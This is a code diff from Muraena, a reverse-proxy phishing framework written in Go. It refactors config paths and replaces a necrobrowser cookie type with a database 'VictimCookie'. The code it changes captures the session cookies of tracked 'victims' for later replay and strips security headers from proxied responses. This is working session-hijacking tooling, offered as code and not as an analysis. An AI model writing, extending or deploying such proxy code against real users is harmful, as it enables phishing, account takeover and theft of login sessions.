@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"crypto/tls"
 	"fmt"
+	"github.com/muraenateam/muraena/core/db"
 	"io/ioutil"
 	"net/http"
 	"net/url"
@@ -16,7 +17,6 @@ import (
 
 	"github.com/muraenateam/muraena/core"
 	"github.com/muraenateam/muraena/log"
-	"github.com/muraenateam/muraena/module/necrobrowser"
 	"github.com/muraenateam/muraena/module/statichttp"
 	"github.com/muraenateam/muraena/module/tracking"
 	"github.com/muraenateam/muraena/session"
@@ -114,8 +114,8 @@ func (muraena *MuraenaProxy) RequestProcessor(request *http.Request) (err error)
 
 	sess := muraena.Session
 	base64 := Base64{
-		sess.Config.Proxy.Transform.Base64.Enabled,
-		sess.Config.Proxy.Transform.Base64.Padding,
+		sess.Config.Transform.Base64.Enabled,
+		sess.Config.Transform.Base64.Padding,
 	}
 
 	// Replacer object
@@ -127,8 +127,8 @@ func (muraena *MuraenaProxy) RequestProcessor(request *http.Request) (err error)
 
 	// DROP
 	dropRequest := false
-	for _, drop := range sess.Config.Proxy.Drop {
-		if request.URL.Path == drop.Url {
+	for _, drop := range sess.Config.Drop {
+		if request.URL.Path == drop.Path {
 			dropRequest = true
 			break
 		}
@@ -161,13 +161,13 @@ func (muraena *MuraenaProxy) RequestProcessor(request *http.Request) (err error)
 	request.URL.RawQuery = query.Encode()
 
 	// Remove headers
-	for _, header := range sess.Config.Proxy.Remove.Request.Header {
+	for _, header := range sess.Config.Remove.Request.Headers {
 		request.Header.Del(header)
 	}
 
 	// Transform Host and other headers of interest
 	request.Host = muraena.Target.Host
-	for _, header := range sess.Config.Proxy.Transform.Request.Header {
+	for _, header := range sess.Config.Transform.Request.Headers {
 		if request.Header.Get(header) != "" {
 			request.Header.Set(header, replacer.Transform(request.Header.Get(header), true, base64))
 		}
@@ -217,8 +217,8 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 
 	sess := muraena.Session
 	base64 := Base64{
-		sess.Config.Proxy.Transform.Base64.Enabled,
-		sess.Config.Proxy.Transform.Base64.Padding,
+		sess.Config.Transform.Base64.Enabled,
+		sess.Config.Transform.Base64.Padding,
 	}
 
 	if response.Request.Header.Get("If-Landing-Redirect") != "" {
@@ -230,7 +230,7 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 				muraena.Session.Config.Proxy.Phishing))
 		response.Header.Set("Location", response.Request.Header.Get("If-Landing-Redirect"))
 
-		//log.Warning("Setting cookies: %s", response.Request.Header.Get("If-Range"))
+		//log.Warning("Setting cookies: %s", response.Request.Headers.Get("If-Range"))
 		return
 	}
 
@@ -243,12 +243,12 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 
 	// DROP
 	dropRequest := false
-	for _, drop := range sess.Config.Proxy.Drop {
-		if response.Request.URL.Path == drop.Url && drop.RedirectTo != "" {
+	for _, drop := range sess.Config.Drop {
+		if response.Request.URL.Path == drop.Path && drop.RedirectTo != "" {
 			// if the response was for the dropped request
 			response.StatusCode = 302
 			response.Header.Set("Location", drop.RedirectTo)
-			log.Info("Dropped request %s redirected to: %s", drop.Url, drop.RedirectTo)
+			log.Info("Dropped request %s redirected to: %s", drop.Path, drop.RedirectTo)
 			dropRequest = true
 			break
 		}
@@ -260,7 +260,7 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 	// Media Type handling.
 	// Prevent processing of unwanted media types
 	mediaType := strings.ToLower(response.Header.Get("Content-Type"))
-	for _, skip := range sess.Config.Proxy.SkipContentType {
+	for _, skip := range sess.Config.Transform.SkipContentType {
 
 		skip = strings.ToLower(skip)
 
@@ -280,23 +280,23 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 	victim := muraena.Tracker.TrackResponse(response)
 	if victim != nil {
 		// before transforming headers like cookies, store the cookies in the CookieJar
-		//log.Debug("Found %d cookies in the response", len(response.Cookies()))
 		for _, c := range response.Cookies() {
 			if c.Domain == "" {
-				//c.Domain = "." + sess.Config.Proxy.Target
 				c.Domain = response.Request.Host
 			}
 
-			sessCookie := necrobrowser.SessionCookie{
+			sessCookie := db.VictimCookie{
 				Name:     c.Name,
 				Value:    c.Value,
 				Domain:   c.Domain,
-				Expires:  "", // will be set by necrobrowser
+				Expires:  c.Expires.String(), // will be set by necrobrowser
 				Path:     c.Path,
 				HTTPOnly: c.HttpOnly,
 				Secure:   c.Secure,
 			}
-			muraena.Tracker.AddToCookieJar(victim, sessCookie)
+
+			//log.Info("%s", sessCookie)
+			muraena.Tracker.AddToCookieJar(victim.ID, sessCookie)
 		}
 	} else {
 
@@ -309,12 +309,12 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 	// HEADERS
 	//
 	// delete security headers
-	for _, header := range sess.Config.Proxy.Remove.Response.Header {
+	for _, header := range sess.Config.Remove.Response.Headers {
 		response.Header.Del(header)
 	}
 
 	// transform headers of interest
-	for _, header := range sess.Config.Proxy.Transform.Response.Header {
+	for _, header := range sess.Config.Transform.Response.Headers {
 		if response.Header.Get(header) != "" {
 			if header == "Set-Cookie" {
 				for k, value := range response.Header["Set-Cookie"] {
@@ -446,9 +446,8 @@ func (st *SessionType) HandleFood(response http.ResponseWriter, request *http.Re
 		}
 	}
 
-
 	// PortMapping
-	if sess.Config.Proxy.Listener.PortMap != "" {
+	if sess.Config.Proxy.PortMap != "" {
 
 		destURL, err := url.Parse(destination)
 		if err != nil {
@@ -464,13 +463,12 @@ func (st *SessionType) HandleFood(response http.ResponseWriter, request *http.Re
 				destination = fmt.Sprintf("%s:%s", destination, port)
 			}
 
-			if strings.HasPrefix(sess.Config.Proxy.Listener.PortMap, fmt.Sprintf("%s:", port)) {
-				newport := strings.Split(sess.Config.Proxy.Listener.PortMap, ":")[1]
+			if strings.HasPrefix(sess.Config.Proxy.PortMap, fmt.Sprintf("%s:", port)) {
+				newport := strings.Split(sess.Config.Proxy.PortMap, ":")[1]
 				destination = strings.Replace(destination, fmt.Sprintf(":%s", port), fmt.Sprintf(":%s", newport), 1)
 			}
 		}
 	}
-
 
 	if destination == "" {
 		log.Error("Unexpected request at: %s", request.Host)
